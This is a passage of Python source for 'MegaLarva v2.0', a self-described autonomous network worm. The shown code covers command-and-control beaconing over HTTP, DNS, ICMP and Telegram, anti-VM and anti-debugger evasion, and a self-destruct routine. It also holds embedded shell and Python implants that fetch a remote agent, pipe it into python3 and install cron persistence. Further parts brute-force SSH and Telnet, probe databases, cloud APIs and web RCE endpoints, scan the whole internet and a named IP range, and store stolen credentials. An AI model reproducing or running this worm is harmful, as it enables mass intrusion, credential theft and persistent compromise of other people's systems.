            self.channels["telegram"] = True
    
    def http_beacon(self, data: Dict) -> Optional[Dict]:
        try:
            if HAVE_REQUESTS:
                resp = requests.post(f"http://{self.c2_host}:10002/beacon", json=data,
                                   headers={"X-Auth-Token": data.get("token", STATIC_TOKEN)}, timeout=10)
                if resp.status_code == 200:
                    return resp.json()
        except:
            pass
        return None
    
    def dns_beacon(self, data: Dict) -> Optional[Dict]:
        try:
            import dns.resolver
            encoded = base64.b64encode(json.dumps(data).encode()).decode()
            domain = f"{encoded}.beacon.wormmesh.local"
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.c2_host]
            resolver.port = 10011
            answers = resolver.resolve(domain, "TXT")
            for rdata in answers:
                try:
                    return json.loads(base64.b64decode(str(rdata)).decode())
                except:
                    continue
        except:
            pass
        return None
    
    def icmp_beacon(self, data: Dict) -> Optional[Dict]:
        try:
            encoded = json.dumps(data).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            pid = os.getpid() & 0xFFFF
            pkt = struct.pack("!BBHHH", 8, 0, 0, pid, 1) + encoded[:64]
            chk = 0
            for i in range(0, len(pkt), 2):
                if i + 1 < len(pkt):
                    chk += (pkt[i] << 8) + pkt[i + 1]
            chk = (chk >> 16) + (chk & 0xFFFF)
            chk = ~chk & 0xFFFF
            pkt = struct.pack("!BBHHH", 8, 0, chk, pid, 1) + encoded[:64]
            sock.sendto(pkt, (self.c2_host, 0))
            sock.settimeout(3)
            reply, addr = sock.recvfrom(1024)
            sock.close()
            if len(reply) > 28:
                return json.loads(reply[28:].decode())
        except:
            pass
        return None
    
    def telegram_send(self, message: str) -> bool:
        if not self.tg_token or not self.tg_chat_id:
            return False
        try:
            if HAVE_REQUESTS:
                url = f"https://api.telegram.org/bot{self.tg_token}/sendMessage"
                resp = requests.post(url, json={"chat_id": self.tg_chat_id, "text": message, "parse_mode": "HTML"}, timeout=10)
                return resp.status_code == 200
        except:
            pass
        return False
    
    def telegram_poll(self) -> Optional[List[Dict]]:
        if not self.tg_token or not self.tg_chat_id:
            return None
        try:
            if HAVE_REQUESTS:
                url = f"https://api.telegram.org/bot{self.tg_token}/getUpdates"
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    return resp.json().get("result", [])
        except:
            pass
        return None
    
    def beacon(self, data: Dict) -> Optional[Dict]:
        if self.channels["http"]:
            result = self.http_beacon(data)
            if result:
                return result
        if self.channels["dns"]:
            result = self.dns_beacon(data)
            if result:
                return result
        if self.channels["icmp"]:
            result = self.icmp_beacon(data)
            if result:
                return result
        if self.channels["telegram"]:
            updates = self.telegram_poll()
            if updates:
                for update in updates:
                    if "message" in update:
                        return {"type": "cmd", "commands": [{"command": update["message"]["text"]}]}
        return None

# ============================================================================
# OPSEC ENGINE — Anti-VM, Anti-Debug, Dead Man Switch, Memory-Only
# ============================================================================
class OPSECEngine:
    """OPSEC anti-forensics and self-defense."""
    def __init__(self, logger=None):
        self.log = logger or log
        self._dead_man_switch = False
        self._last_c2_contact = time.time()
    
    def detect_vm(self) -> bool:
        indicators = ["/vmmouse.pid", "/vbox_version", "/.dockerenv"]
        for path in indicators:
            try:
                if os.path.exists(path):
                    with open(path) as f:
                        c = f.read().lower()
                        if any(v in c for v in ["vmware", "vbox", "qemu"]):
                            return True
            except:
                pass
        try:
            cores = os.cpu_count()
            if cores and cores <= 2:
                return True
        except:
            pass
        try:
            import psutil
            mem = psutil.virtual_memory()
            if mem.total < 2 * 1024 * 1024 * 1024:
                return True
        except:
            pass
        return False
    
    def detect_debugger(self) -> bool:
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            PTRACE_TRACEME = 0
            if libc.ptrace(PTRACE_TRACEME, 0, None, None) == -1:
                return True
        except:
            pass
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if "TracerPid" in line and line.split(":")[1].strip() != "0":
                        return True
        except:
            pass
        return False
    
    def dead_man_switch_init(self, timeout_days: int = 7) -> None:
        self._dead_man_switch = True
        self._last_c2_contact = time.time()
        threading.Thread(target=self._dead_man_check, args=(timeout_days,), daemon=True).start()
    
    def _dead_man_check(self, timeout_days: int):
        while self._dead_man_switch:
            time.sleep(3600)
            if time.time() - self._last_c2_contact > timeout_days * 86400:
                self.log("[OPSEC] Dead man switch triggered! Self-destructing...")
                self._self_destruct()
    
    def update_c2_contact(self):
        self._last_c2_contact = time.time()
    
    def _self_destruct(self):
        targets = ["/opt/hermes/MegaLarva.py", "/opt/hermes/worm_mesh_engine.py",
                  "/tmp/.worm_*", "/opt/.worm/"]
        for t in targets:
            try:
                if os.path.isfile(t):
                    os.remove(t)
                elif os.path.isdir(t):
                    import shutil
                    shutil.rmtree(t, ignore_errors=True)
            except:
                pass
        try:
            os.system("crontab -r 2>/dev/null")
            os.system("systemctl disable worm-mesh.service 2>/dev/null")
            os.system("systemctl stop worm-mesh.service 2>/dev/null")
        except:
            pass
        self.log("[OPSEC] Self-destruct complete. Exiting.")
        os._exit(0)
    
    def run_checks(self) -> bool:
        if self.detect_vm():
            self.log("[OPSEC] VM detected! Exiting.")
            return False
        if self.detect_debugger():
            self.log("[OPSEC] Debugger detected! Exiting.")
            return False
        return True

# ============================================================================
# IoT AGENT — Embedded two-stage shell + Python implant
# ============================================================================
EMBEDDED_IOT_AGENT_SH = r'''#!/bin/sh
# MegaLarva IoT Agent — Zero-dependency shell implant
# by🇭🇷PhonkAlphabet
C2="''' + C2_HOST + '''"
TOKEN="''' + STATIC_TOKEN + '''"
BEACON_URL="http://$C2:10002/beacon"
# Stage 1: heartbeat
ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null | cut -c1-8 || echo "iot-$$")
IP=$(ip route get 1 | awk '{print $NF;exit}')
ARCH=$(uname -m)
wget -q -O- --post-data="{\"id\":\"$ID\",\"ip\":\"$IP\",\"arch\":\"$ARCH\"}" \
     --header="X-Auth-Token: $TOKEN" $BEACON_URL 2>/dev/null || \
curl -s -X POST -H "X-Auth-Token: $TOKEN" -d "{\"id\":\"$ID\",\"ip\":\"$IP\",\"arch\":\"$ARCH\"}" $BEACON_URL 2>/dev/null
# Stage 2: download and exec Python agent
PY_URL="http://$C2:10002/MegaLarva.py?token=$TOKEN"
if command -v python3 >/dev/null 2>&1; then
    wget -q -O- $PY_URL 2>/dev/null | python3 &
elif command -v python >/dev/null 2>&1; then
    wget -q -O- $PY_URL 2>/dev/null | python &
fi
# Persistence
for rc in /etc/rc.local /etc/init.d/rcS /etc/inittab; do
    [ -w "$rc" ] && echo "$0 &" >> "$rc" 2>/dev/null
done
crontab -l 2>/dev/null | { cat; echo "*/10 * * * * $0"; } | crontab - 2>/dev/null
'''

EMBEDDED_PYTHON_IMPLANT = r'''import sys,os,base64,json,urllib.request,uuid,socket,subprocess,time,random,threading
C2="''' + C2_HOST + '''";TOKEN="''' + STATIC_TOKEN + '''";ID=str(uuid.uuid4())[:8]
def beacon():
    try:
        data=json.dumps({"id":ID,"ip":"","arch":os.uname()[4]}).encode()
        req=urllib.request.Request(f"http://{C2}:10002/beacon",data=data,
            headers={"X-Auth-Token":TOKEN,"Content-Type":"application/json"})
        urllib.request.urlopen(req,timeout=10)
    except:pass
def scan_subnet():
    ip_parts=socket.gethostbyname(socket.gethostname()).split(".")
    subnet=f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
    for i in range(1,255):
        target=f"{subnet}.{i}"
        if target==socket.gethostbyname(socket.gethostname()): continue
        for port in (22,23,80,443,8080):
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1)
                if s.connect_ex((target,port))==0:
                    s.close()
                    data=json.dumps({"id":ID,"target":target,"port":port}).encode()
                    req=urllib.request.Request(f"http://{C2}:10002/beacon",data=data,
                        headers={"X-Auth-Token":TOKEN})
                    urllib.request.urlopen(req,timeout=5)
                    break
                s.close()
            except:pass
def persist():
    try:
        cron=os.popen("crontab -l 2>/dev/null").read()
        if "MegaLarva" not in cron:
            os.system(f'(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://{C2}:10002/MegaLarva.py?token={TOKEN} | python3 &")|crontab -')
    except:pass
while True:
    try:
        beacon()
        scan_subnet()
        persist()
        time.sleep(300)
    except:
        time.sleep(60)
'''

# ============================================================================
# WORM MASTER ORCHESTRATOR
# ============================================================================
class WormMaster:
    """Master orchestrator — autonomous worm cycling."""
    def __init__(self):
        self.running = True
        self.stats = {"started": time.time(), "targets_found": 0, "targets_exploited": 0,
                      "deployments": 0, "mesh_peers": 0, "exfiltrated": 0,
                      "cycles": 0}
        self.components = {}
        self.core = None
        self.db = None
        self.c2 = C2MultiChannel(logger=log)
        self.opsec = OPSECEngine(logger=log)
        self.mesh = MeshNetworkEngine(logger=log, db=None, my_ip=C2_HOST, port=10007)
        self.post_exploit = PostExploitEngine(logger=log, db=None, c2_host=C2_HOST)
        self.db_exploit = DatabaseExploitEngine(logger=log)
        self.cloud_exploit = CloudExploitEngine(logger=log)
        self.arp_engine = ARPEngine(logger=log)
        self.dns_poison = DNSPoisonEngine(logger=log, c2_ip=C2_HOST)
        self.lateral = LateralMoveEngine(logger=log, db=None)
        self._init_core()
        self._init_db()
    
    def _init_core(self):
        if HAVE_CORE:
            try:
                self.core = WormMeshEngine(db=self.db)
                log.info("✅ Core engine loaded (worm_mesh_engine.py)")
                self.components["core"] = self.core
            except Exception as e:
                log.warning(f"Core engine init failed: {e}")
    
    def _init_db(self):
        try:
            self.db = sqlite3.connect(DB_PATH)
            self.db.execute("CREATE TABLE IF NOT EXISTS targets (ip TEXT PRIMARY KEY, port INT, service TEXT, first_seen INT, last_seen INT, exploited INT)")
            self.db.execute("CREATE TABLE IF NOT EXISTS creds (ip TEXT, username TEXT, password TEXT, service TEXT, UNIQUE(ip,username,password))")
            self.db.execute("CREATE TABLE IF NOT EXISTS mesh_state (key TEXT PRIMARY KEY, value TEXT, updated_at INT)")
            self.db.execute("CREATE TABLE IF NOT EXISTS exfil (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, path TEXT, size INT, data TEXT, ts INT)")
            self.db.execute("CREATE TABLE IF NOT EXISTS deploys (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, method TEXT, status TEXT, ts INT)")
            self.db.commit()
            log.info("✅ Database initialized")
        except Exception as e:
            log.warning(f"Database init failed: {e}")
    
    def _check_blocked(self, ip: str) -> bool:
        return any(b in ip.lower() for b in BLOCKED_HOSTS)
    
    def scan_port(self, ip: str, port: int) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((ip, port))
            s.close()
            return result == 0
        except:
            return False
    
    def scan_target(self, ip: str, ports: List[int] = None) -> List[Dict]:
        if ports is None:
            ports = [22, 23, 80, 443, 8080, 8443, 3306, 6379, 27017, 9200, 5432, 11211, 2375, 2376, 6443, 8006]
        results = []
        for port in ports:
            if self.scan_port(ip, port):
                results.append({"ip": ip, "port": port})
        return results
    
    def exploit_single(self, target_ip: str, port: int) -> Optional[Dict]:
        if self._check_blocked(target_ip):
            log.warning(f"Blocked host: {target_ip}")
            return None
        
        result = {"ip": target_ip, "port": port, "success": False, "method": "", "creds": None}
        
        # 1. Core engine (SSH/Telnet brute force)
        if self.core and port in (22, 23):
            try:
                target = {"ip": target_ip, "port": port, "service": "ssh" if port == 22 else "telnet"}
                exploit_result = self.core.exploit_engine.exploit_target(target)
                if exploit_result and exploit_result.success:
                    result["success"] = True
                    result["method"] = "core_brute"
                    result["creds"] = exploit_result.credential
                    self._save_creds(target_ip, exploit_result.credential, "ssh" if port == 22 else "telnet")
                    return result
            except:
                pass
        
        # 2. Database exploits
        if port in (3306, 6379, 27017, 9200, 5432, 11211):
            try:
                db_result = self.db_exploit.exploit_all(target_ip)
                if db_result:
                    result["success"] = True
                    result["method"] = f"db_{list(db_result.keys())[0]}"
                    return result
            except:
                pass
        
        # 3. Cloud exploits
        if port in (2375, 2376, 6443, 8006):
            try:
                cloud_result = self.cloud_exploit.exploit_all(target_ip)
                if cloud_result:
                    result["success"] = True
                    result["method"] = f"cloud_{list(cloud_result.keys())[0]}"
                    return result
            except:
                pass
        
        # 4. Web RCE (80, 443, 8080, 8443)
        if port in (80, 443, 8080, 8443):
            try:
                web_result = self._web_rce(target_ip, port)
                if web_result:
                    result["success"] = True
                    result["method"] = "web_rce"
                    result["creds"] = ("root", web_result)
                    self._save_creds(target_ip, ("root", "rce_shell"), "web")
                    return result
            except:
                pass
        
        return result
    
    def _web_rce(self, ip: str, port: int) -> Optional[str]:
        """Quick web RCE check — common endpoints."""
        endpoints = [
            f"http://{ip}:{port}/shell?cmd=id",
            f"http://{ip}:{port}/cgi-bin/status?cmd=id",
            f"http://{ip}:{port}/command?cmd=id",
            f"http://{ip}:{port}/exec?cmd=id",
            f"http://{ip}:{port}/ping?ip=127.0.0.1;id",
            f"http://{ip}:{port}/?cmd=id",
        ]
        if HAVE_REQUESTS:
            for ep in endpoints:
                try:
                    resp = requests.get(ep, timeout=3)
                    if resp.status_code == 200 and ("uid=" in resp.text or "root" in resp.text.lower()):
                        return ep
                except:
                    continue
        return None
    
    def _save_creds(self, ip: str, creds: Tuple[str, str], service: str):
        if not self.db:
            return
        try:
            self.db.execute("INSERT OR IGNORE INTO creds (ip, username, password, service) VALUES (?, ?, ?, ?)",
                           (ip, creds[0], creds[1], service))
            self.db.commit()
        except:
            pass
    
    def deploy_to_target(self, ip: str, creds: Tuple[str, str], port: int) -> bool:
        """Deploy MegaLarva agent to target."""
        user, password = creds
        deploy_url = f"http://{C2_HOST}:10002/{SELF_NAME}?token=CHANGE_ME_STATIC_TOKEN"
        
        if port == 22 and HAVE_PARAMIKO:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=password, timeout=10)
                # Deploy IoT agent first (lightweight), then MegaLarva.py
                iot_b64 = base64.b64encode(EMBEDDED_IOT_AGENT_SH.encode()).decode()
                cmd = f"echo '{iot_b64}' | base64 -d > /tmp/.mega.sh && chmod +x /tmp/.mega.sh && sh /tmp/.mega.sh &"
                client.exec_command(cmd, timeout=15)
                client.close()
                self._save_deploy(ip, "ssh", "success")
                self.stats["deployments"] += 1
                return True
            except Exception as e:
                log.warning(f"SSH deploy failed for {ip}: {e}")
        
        if port == 23:
            try:
                # Telnet deploy via echo pipe
                iot_b64 = base64.b64encode(EMBEDDED_IOT_AGENT_SH.encode()).decode()
                cmd = f"echo '{iot_b64}' | base64 -d > /tmp/.mega.sh && sh /tmp/.mega.sh &"
                subprocess.run(["timeout", "10", "bash", "-c", 
                    f"exec 3<>/dev/tcp/{ip}/23; echo '{user}\n{password}\n{cmd}\nexit\n' >&3"],
                    capture_output=True, timeout=15)
                self._save_deploy(ip, "telnet", "success")
                self.stats["deployments"] += 1
                return True
            except:
                pass
        
        return False
    
    def _save_deploy(self, ip: str, method: str, status: str):
        if not self.db:
            return
        try:
            self.db.execute("INSERT INTO deploys (ip, method, status, ts) VALUES (?, ?, ?, ?)",
                           (ip, method, status, int(time.time())))
            self.db.commit()
        except:
            pass
    
    def report_status(self) -> str:
        """Generate formatted status report."""
        uptime = int(time.time() - self.stats["started"])
        report = f"""🧬 **MegaLarva v{VERSION}** — Autonomous Worm Mesh
⏱️ Uptime: {uptime//3600}h {(uptime%3600)//60}m
📊 **Stats:**
  • Cycles: `{self.stats['cycles']}`
  • Targets found: `{self.stats['targets_found']}`
  • Targets exploited: `{self.stats['targets_exploited']}`
  • Deployments: `{self.stats['deployments']}`
  • Mesh peers: `{self.stats['mesh_peers']}`
  • Exfiltrated: `{self.stats['exfiltrated']}`
🧩 **Components:**
  • Core engine: {'✅' if HAVE_CORE else '❌'}
  • Requests/HTTP: {'✅' if HAVE_REQUESTS else '❌'}
  • Paramiko/SSH: {'✅' if HAVE_PARAMIKO else '❌'}
  • Scapy/NET: {'✅' if HAVE_SCAPY else '❌'}
🔌 C2 Multi-Channel: HTTP{' + DNS' if self.c2.channels['dns'] else ''}{' + ICMP' if self.c2.channels['icmp'] else ''}{' + TG' if self.c2.channels['telegram'] else ''}
🛡️ OPSEC: {'Passed' if self.opsec.run_checks() else 'Failed'}
🕸️ Mesh: {'Active' if self.mesh.get_peers() else 'Standalone'}
by🇭🇷PhonkAlphabet"""
        return report
    
    def cycle(self) -> Dict:
        """One complete autonomous cycle."""
        self.stats["cycles"] += 1
        cycle_id = self.stats["cycles"]
        log.info(f"=== CYCLE {cycle_id} STARTING ===")
        
        results = {"cycle": cycle_id, "scanned": 0, "exploited": 0, "deployed": 0}
        
        # Phase 1: Get targets from core engine or known subnets
        targets = []
        if self.core:
            try:
                subnet = "0.0.0.0/0"
                self.core.run_reconnaissance(subnet=subnet)
                targets = self.db.execute("SELECT ip, port FROM targets WHERE exploited=0 LIMIT 50").fetchall() if self.db else []
                targets = [{"ip": t[0], "port": t[1]} for t in targets]
                log.info(f"Core engine found {len(targets)} targets")
            except:
                pass
        
        if not targets:
            # Fallback: pull target IPs from existing C2 databases, then fast-scan common ports
            seen = set()
            bot_ips = set()
            existing_dbs = [
                "/opt/c2/hybrid_c2.db",
                "/opt/chimera/undead_cube.db",
                "/opt/hermes/megalarva.db",
            ]
            for db_path in existing_dbs:
                try:
                    conn = sqlite3.connect(db_path, timeout=5)
                    c = conn.cursor()
                    for tbl in ["bots", "creds", "hosts", "targets", "intel"]:
                        try:
                            c.execute(f"SELECT DISTINCT ip FROM {tbl} WHERE ip IS NOT NULL AND ip != '' LIMIT 30")
                            bot_ips.update(str(r[0]) for r in c.fetchall())
                        except:
                            try:
                                c.execute(f"SELECT DISTINCT target FROM {tbl} WHERE target IS NOT NULL AND target != '' LIMIT 30")
                                bot_ips.update(str(r[0]) for r in c.fetchall())
                            except:
                                continue
                    conn.close()
                except:
                    continue
            
            # Pull known targets from C2 creds table with specific IP:port pairs
            try:
                conn = sqlite3.connect("/opt/c2/hybrid_c2.db", timeout=5)
                cur = conn.cursor()
                cur.execute("SELECT DISTINCT target FROM creds WHERE target IS NOT NULL AND target != '' LIMIT 100")
                for row in cur.fetchall():
                    ip_str = str(row[0]).strip()
                    if self._check_blocked(ip_str):
                        continue
                    for p in [22, 23, 80, 443, 8080]:
                        key = f"{ip_str}:{p}"
                        if key not in seen:
                            seen.add(key)
                            targets.append({"ip": ip_str, "port": p})
                conn.close()
            except:
                pass
            log.info(f"After cred targets: {len(targets)} total targets")
            
            # Also probe user's priority 5.188.x.x range (20 IPs per cycle round-robin)
            prio_seed = self.stats["cycles"]
            bot_ips.update(f"5.188.{o}.{p}" for o in range(prio_seed * 2 % 256, (prio_seed * 2 + 2) % 256) for p in range(0, 10))
            
            # Fast parallel TCP probe on common ports
            common_ports = [22, 23, 80, 443, 8080, 3306, 6379, 10001, 10002]
            port_futures = {}
            with ThreadPoolExecutor(max_workers=min(50, len(bot_ips) * len(common_ports))) as tpool:
                for ip in sorted(bot_ips):
                    if self._check_blocked(ip):
                        continue
                    for port in common_ports:
                        fut = tpool.submit(self.scan_port, ip, port)
                        port_futures[fut] = (ip, port)
                try:
                    for fut in as_completed(port_futures, timeout=30):
                        try:
                            ip, port = port_futures[fut]
                            if fut.result():
                                key = f"{ip}:{port}"
                                if key not in seen:
                                    seen.add(key)
                                    targets.append({"ip": ip, "port": port})
                        except:
                            continue
                except TimeoutError:
                    pass  # collected partial results within 30s window
            
            log.info(f"Fallback: scanned {len(bot_ips)} IPs, found {len(targets)} open ports")
            
            if not targets:
                # Last resort: scan localhost for testing
                log.warning("No targets found — scanning localhost")
                for port in [22, 80, 443, 10001, 10002]:
                    if self.scan_port("127.0.0.1", port):
                        targets.append({"ip": "127.0.0.1", "port": port})
        
        results["scanned"] = len(targets)
        self.stats["targets_found"] += len(targets)
        
        # Phase 2: Exploit targets in parallel
        exploited = []
        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = {}
            for t in targets[:30]:
                fut = pool.submit(self.exploit_single, t["ip"], t["port"])
                futures[fut] = t
            for fut in as_completed(futures):
                try:
                    r = fut.result()
                    if r and r["success"]:
                        exploited.append(r)
                        if self.db:
                            self.db.execute("UPDATE targets SET exploited=1 WHERE ip=? AND port=?", 
                                          (r["ip"], r["port"]))
                except:
                    continue
        
        if self.db:
            self.db.commit()
        
        results["exploited"] = len(exploited)
        self.stats["targets_exploited"] += len(exploited)
        
        # Phase 3: Deploy to exploited targets
        for r in exploited:
            if r["creds"]:
                try:
                    if self.deploy_to_target(r["ip"], r["creds"], r["port"]):
                        results["deployed"] += 1
                except:
                    continue
        
        self.stats["deployments"] += results["deployed"]
        
        # Phase 4: Report via C2
        report = f"🔄 **Cycle {cycle_id} Complete**\n  • Scanned: `{results['scanned']}` targets\n  • Exploited: `{results['exploited']}` targets\n  • Deployed: `{results['deployed']}` agents"
        self.c2.telegram_send(report)
        self.opsec.update_c2_contact()
        
        log.info(f"=== CYCLE {cycle_id} DONE: {results['exploited']} exploited, {results['deployed']} deployed ===")
        return results
    
    def autonomous_loop(self, interval: int = 120):
        """Run autonomous cycles indefinitely."""
        log.info("[AUTO] Starting autonomous cycling mode")
        log.info(f"[AUTO] Cycle interval: {interval}s")
        self.c2.telegram_send(f"🚀 **MegaLarva v{VERSION}** — Autonomous mode started\n⏱️ Interval: {interval}s\n🧩 Core: {'✅' if HAVE_CORE else '❌'}")
        
        while self.running:
            try:
                self.cycle()
                log.info(f"[AUTO] Sleeping {interval}s until next cycle...")
                for _ in range(interval // 5):
                    if not self.running:
                        break
                    time.sleep(5)
            except Exception as e:
                log.error(f"[AUTO] Cycle error: {e}")
                time.sleep(30)
        
        log.info("[AUTO] Autonomous mode stopped")
    
    def stop(self):
        self.running = False
        self.mesh.stop()
        report = self.report_status()
        self.c2.telegram_send(f"🛑 **MegaLarva v{VERSION}** — Shutting down\n\n{report}")
        log.info("[MASTER] MegaLarva stopped")

# ============================================================================
# CLI
# ============================================================================
def main():
    parser = argparse.ArgumentParser(description="MegaLarva v2.0 — Autonomous Worm Mesh Ultimate")
    parser.add_argument("--auto", action="store_true", help="Autonomous cycling mode")
    parser.add_argument("--interval", type=int, default=120, help="Cycle interval (seconds)")
    parser.add_argument("--cycle", action="store_true", help="Run one cycle")
    parser.add_argument("--status", action="store_true", help="Show status")
    parser.add_argument("--mesh", action="store_true", help="Start mesh node")
    parser.add_argument("--seed", type=str, help="Mesh seed peer IPs (comma-separated)")
    parser.add_argument("--exploit", type=str, help="Exploit single target (IP)")
    parser.add_argument("--port", type=int, default=22, help="Port for exploit")
    parser.add_argument("--scan", type=str, help="Scan single target (IP)")
    parser.add_argument("--deploy-agent", type=str, help="Deploy agent to target (IP:port:user:pass)")
    parser.add_argument("--telegram", type=str, help="Send message via Telegram")
    parser.add_argument("--daemon", action="store_true", help="Daemonize to background")
    
    args = parser.parse_args()
    master = WormMaster()
    
    if args.daemon:
        # Fork to background
        pid = os.fork()
        if pid > 0:
            print(f"[DAEMON] Forked to PID {pid}")
            sys.exit(0)
        # Child continues
        os.setsid()
    
    if args.status:
        print(master.report_status())
        return
    
    if args.telegram:
        master.c2.telegram_send(args.telegram)
        print("Telegram sent")
        return
    
    if args.scan:
        print(f"Scanning {args.scan}...")
        ports = master.scan_target(args.scan)
        for p in ports:
            print(f"  {p['ip']}:{p['port']} OPEN")
        print(f"Found {len(ports)} open ports")
        return
    
    if args.exploit:
        print(f"Exploiting {args.exploit}:{args.port}...")
        result = master.exploit_single(args.exploit, args.port)
        if result and result["success"]:
            print(f"✅ SUCCESS: {result['method']} — creds: {result['creds']}")
        else:
            print("❌ FAILED")
        return
    
    if args.deploy_agent:
        parts = args.deploy_agent.split(":")
        if len(parts) >= 4:
            ip, port, user, password = parts[0], int(parts[1]), parts[2], ":".join(parts[3:])
            result = master.deploy_to_target(ip, (user, password), port)
            print(f"Deploy: {'✅' if result else '❌'} {ip}")
        else:
            print("Format: --deploy-agent ip:port:user:pass")
        return
    
    if args.mesh:
        seed_peers = args.seed.split(",") if args.seed else []
        threading.Thread(target=master.mesh.start_server, daemon=True).start()
        time.sleep(1)
        if seed_peers:
            for peer in seed_peers:
                master.mesh._join_peer(peer)
        master.mesh.discover_peers(seed_peers)
        time.sleep(2)
        master.mesh.start_leader_election()
        print(f"🕸️ Mesh node started (ID: {master.mesh.node_id})")
        print(f"   Peers: {len(master.mesh.get_peers())}")
        try:
            while True:
                time.sleep(10)
        except KeyboardInterrupt:
            master.stop()
        return
    
    if args.cycle:
        result = master.cycle()
        print(f"Cycle {result['cycle']}: {result['exploited']} exploited, {result['deployed']} deployed")
        return
    
    if args.auto:
        master.autonomous_loop(interval=args.interval)
        return
    
    # Interactive mode
    print(f"""
╔═══════════════════════════════════════════════════════════╗
║  🧬 MegaLarva v{VERSION} — Autonomous Worm Mesh Ultimate  ║
║  👾 by PhonkAlphabet 👾                                   ║
╚═══════════════════════════════════════════════════════════╝

Commands:
  auto                    Start autonomous cycling
  cycle                   Run one cycle
  scan <ip>               Scan target
  exploit <ip> <port>     Exploit target
  deploy <ip> <port> <user> <pass>   Deploy agent
  mesh [seed_ip,...]      Start mesh node
  status                  Show status
  telegram <message>      Send Telegram
  help                    This help
  exit                    Quit
""")
    
    while True:
        try:
            cmd = input("mega> ").strip()
            if not cmd:
                continue
            if cmd == "exit":
                break
            if cmd == "help":
                print("Commands: auto, cycle, scan <ip>, exploit <ip> <port>, deploy <ip> <port> <user> <pass>, mesh, status, telegram <msg>")
                continue
            if cmd == "auto":
                master.autonomous_loop()
                break
            if cmd == "cycle":
                r = master.cycle()
                print(f"Cycle {r['cycle']}: {r['exploited']} exploited, {r['deployed']} deployed")
                continue
            if cmd == "status":
                print(master.report_status())
                continue
            if cmd.startswith("scan "):
                ip = cmd.split()[1]
                ports = master.scan_target(ip)
                print(f"Found {len(ports)} open ports on {ip}")
                for p in ports:
                    print(f"  {p['port']} OPEN")
                continue
            if cmd.startswith("exploit "):
                parts = cmd.split()
                ip = parts[1]
                port = int(parts[2]) if len(parts) > 2 else 22
                r = master.exploit_single(ip, port)
                if r and r["success"]:
                    print(f"✅ {r['method']} — creds: {r['creds']}")
                else:
                    print("❌ No exploit found")
                continue
            if cmd.startswith("deploy "):
                parts = cmd.split()
                ip, port, user, password = parts[1], int(parts[2]), parts[3], " ".join(parts[4:])
                r = master.deploy_to_target(ip, (user, password), port)
                print(f"Deploy: {'✅' if r else '❌'}")
                continue
            if cmd.startswith("mesh"):
                seed = cmd.split()[1] if len(cmd.split()) > 1 else None
                threading.Thread(target=master.mesh.start_server, daemon=True).start()
                if seed:
                    for peer in seed.split(","):
                        master.mesh._join_peer(peer)
                print(f"Mesh started (ID: {master.mesh.node_id})")
                continue
            if cmd.startswith("telegram "):
                msg = cmd[9:]
                master.c2.telegram_send(msg)
                print("Sent")
                continue
            print("Unknown command. Type 'help'.")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
    
    master.stop()

if __name__ == "__main__":
    main()
